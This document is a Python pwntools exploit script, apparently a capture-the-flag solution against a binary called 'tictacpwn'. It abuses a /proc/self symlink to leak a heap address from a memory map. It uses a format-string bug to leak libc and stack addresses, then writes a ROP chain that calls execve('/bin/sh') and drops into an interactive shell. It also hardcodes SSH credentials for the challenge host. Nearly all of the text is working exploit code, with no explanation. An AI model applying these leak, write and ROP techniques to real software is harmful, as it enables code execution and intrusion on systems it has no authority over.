from pwn import *
import re
import os
from base64 import b64encode

##########################################################################
##########################################################################
####################### GLOBALS AND CONSTANTES ###########################
##########################################################################
CARD_PATH = '/tmp/toto'
WIN_MESSAGE = 'Good job on your win !'
EXIT_MESSAGE = 'You chose to exit. Bye!'
QUESTION_CHOICE_MESSAGE = 'What do you pick ?'

# log level
# context.log_level = 'debug'

OFFSET_LIBC_START_CALL_MAIN = 122
OFFSET_LIBC_START_MAIN = 0xB0
OFFSET_RET_ADDR = 0x110
DEBUG = True

ssh_session = None


##########################################################################
##########################################################################
####################### FUNCTIONS ########################################
##########################################################################
def text2hex(text):
    return ''.join([hex(ord(c))[2:].rjust(2) for c in text[::-1]])


def remove_card_folder():
    global CARD_PATH, ssh_session, DEBUG
    if not DEBUG:
        sh = ssh_session.process('/bin/sh')
        sh.sendline(('rm -rf ' + CARD_PATH + '; exit'))
    else:
        if os.path.exists(CARD_PATH):
            if os.path.islink(CARD_PATH):
                os.unlink(CARD_PATH)
            else:
                maps_path = CARD_PATH + '/maps'
                if os.path.exists(maps_path):
                    os.remove(maps_path)
                os.rmdir(CARD_PATH)


def create_card():
    global CARD_PATH, ssh_session, DEBUG
    card = "\n".join(["A" * 16 for i in range(17)])
    filepath = CARD_PATH + '/maps'
    remove_card_folder()
    if not DEBUG:
        sh = ssh_session.process('/bin/sh')
        sh.sendline(('mkdir ' + CARD_PATH + ';echo "' + b64encode(card) + '" | base64 -d > ' + filepath + '; exit'))
    else:
        os.mkdir(CARD_PATH)
        with open(filepath, 'w') as f:
            f.write(card)


def create_symlink():
    global CARD_PATH, ssh_session, DEBUG
    remove_card_folder()
    if not DEBUG:
        sh = ssh_session.process('/bin/sh')
        sh.sendline(('ln -s /proc/self ' + CARD_PATH))
    else:
        os.symlink('/proc/self', CARD_PATH)


# Leak heap address
def load_card(p):
    p.recvuntil(b'Do you want to load a custom card for rock ?')
    p.sendline(b"y")

    p.recvuntil(b'Give me the path to the custom card:')

    create_card()
    p.sendline(b"/tmp/toto/maps")

    p.recvuntil(b'What do you pick ?')
    create_symlink()
    p.sendline(b"1")

    p.recvuntil(b'You chose rock !')
    maps = p.recvn(1000)

    addr_heap = int(re.findall(r"([abcdef\d]*)-[abcdef\d]*.*\n.*\[heap\]", maps)[0], 16)

    return addr_heap, maps


def print_data(data):
    print(''.join(["\\x" + hex(ord(b))[2:].rjust(2, "0") for b in data]))


def write(p, addr, value, game_round=None, win=True):
    lose = game_round is None
    i = 0
    result = ''

    p.sendline(hex(addr)[2:])
    p.recvuntil(b'What do you want to write ?')
    p.sendline(value)

    while (lose and EXIT_MESSAGE not in result) or (not lose and i < game_round):
        result = p.recvuntil([QUESTION_CHOICE_MESSAGE, EXIT_MESSAGE])
        if EXIT_MESSAGE not in result:
            p.sendline(b"1" if win else "3")
        i += 1


def leak_addr(p, game_round, offset):
    write(p, exe.sym.WIN_MESSAGE, text2hex("%" + str(offset) + "$llx\0"), game_round)

    return int(p.recvuntil(b"You're now allowed to").split('\n')[-1].split("You're")[0], 16)


##########################################################################
##########################################################################
####################### LOAD BINARIES ####################################
##########################################################################
exe = ELF('tictacpwn')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6' if DEBUG else './libc.so')
libc_rop = ROP(libc)

##########################################################################
##########################################################################
####################### LOAD CARD AND WIN THE GAME #######################
##########################################################################
success = False
while not success:
    if DEBUG:
        p = process(exe.path)
    else:
        ssh_session = ssh(host='ssh-zqmnmc.inst.malicecyber.com', user='user', password='user', port=4101)
        p = ssh_session.process('/challenge/tictacpwn')

    game_round = 1
    ADDR_HEAP, result = load_card(p)
    log.info('Heap address : ' + hex(ADDR_HEAP))

    # Rebase exe
    exe.address = ADDR_HEAP - 0x4000

    while EXIT_MESSAGE not in result and WIN_MESSAGE not in result:
        p.clean()
        p.sendline(b"1")
        result = p.recvuntil([WIN_MESSAGE, EXIT_MESSAGE, QUESTION_CHOICE_MESSAGE])
        game_round += 1

    success = WIN_MESSAGE in result

##########################################################################
##########################################################################
####################### LEAK ADDRESSES ###################################
##########################################################################
# Leak libc (__libc_start_call_main+OFFSET_LIBC_START_CALL_MAIN)
addr_libc_start_call_main = leak_addr(p, game_round, 15) - OFFSET_LIBC_START_CALL_MAIN
addr_libc_start_main = addr_libc_start_call_main + OFFSET_LIBC_START_MAIN

# Leak stack addr
addr_stack = leak_addr(p, game_round, 19)

# Ret addr
addr_ret = addr_stack - OFFSET_RET_ADDR

log.info('Leak libc_start_main : ' + hex(addr_libc_start_main))
log.info('Leak stack : ' + hex(addr_stack))
log.info('Leak ret address : ' + hex(addr_ret))

##########################################################################
##########################################################################
####################### WRITE PAYLOAD ####################################
##########################################################################
# Rebase libc
libc.address = addr_libc_start_main - libc.sym.__libc_start_main

# Payload:

payload = [
    libc_rop.find_gadget(['pop rdi', 'ret']).address + libc.address,
    next(libc.search('/bin/sh')),
    libc_rop.find_gadget(['pop rsi', 'ret']).address + libc.address,
    0x0,
    libc_rop.find_gadget(['pop rdx', 'ret']).address + libc.address,
    0x0,
    libc.sym.execve,
]

# Write ROP chain
for i, value in enumerate(payload):
    write(p, addr_ret + (i * 8), hex(value)[2:], game_round, i < len(payload) - 1)

##########################################################################
##########################################################################
####################### CLEAN AND POP SHELL ##############################
##########################################################################
remove_card_folder()

p.clean()
p.interactive()
